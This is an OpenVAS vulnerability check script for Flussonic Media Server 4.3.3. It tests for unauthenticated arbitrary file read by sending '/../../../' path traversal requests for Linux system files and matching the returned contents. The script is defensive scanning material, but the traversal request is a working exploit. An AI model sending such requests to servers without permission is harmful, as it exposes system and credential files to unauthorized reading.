###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_flussonic_media_server_lfi_06_14.nasl 13543 2019-02-08 14:43:51Z cfischer $
#
# Flussonic Media Server Multiple Security Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105053");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_version("$Revision: 13543 $");
  script_name("Flussonic Media Server Multiple Security Vulnerabilities");
  script_tag(name:"last_modification", value:"$Date: 2019-02-08 15:43:51 +0100 (Fri, 08 Feb 2019) $");
  script_tag(name:"creation_date", value:"2014-06-30 17:20:40 +0200 (Mon, 30 Jun 2014)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 8080);
  script_require_keys("Host/runs_unixoide");
  script_mandatory_keys("cowboy/banner");

  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2014/Jun/167");

  script_tag(name:"impact", value:"It's possible to read any files/directories from the server (with the
  application's user's permissions) by a simple HTTP GET request.");

  script_tag(name:"vuldetect", value:"Send a HTTP GET request and check the response");

  script_tag(name:"insight", value:"Flussonic Media Server is prone to a:

  1. Arbitrary File Read (Unauthenticated)

  2. Arbitrary Directory Listing (Authenticated)");

  script_tag(name:"solution", value:"Update to Flussonic Media Server 4.3.4");

  script_tag(name:"summary", value:"Flussonic Media Server 4.3.3 Multiple Vulnerabilities");

  script_tag(name:"affected", value:"Flussonic Media Server 4.3.3");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port( default:8080 );
banner = get_http_banner( port:port );
if( "server: cowboy" >!< tolower( banner ) ) exit( 0 );

files = traversal_files( "linux" );

foreach pattern( keys( files ) ) {

  file = files[pattern];

  url = '/../../../' + file;
  if( buf = http_vuln_check( port:port, url:url, pattern:pattern ) )
  {
    report = report_vuln_url( port:port, url:url );
    req_resp = 'Request:\n' + __ka_last_request + '\nResponse:\n' + buf;
    security_message( port:port, data:report, expert_info:req_resp );
    exit(0);
  }
}

exit(99);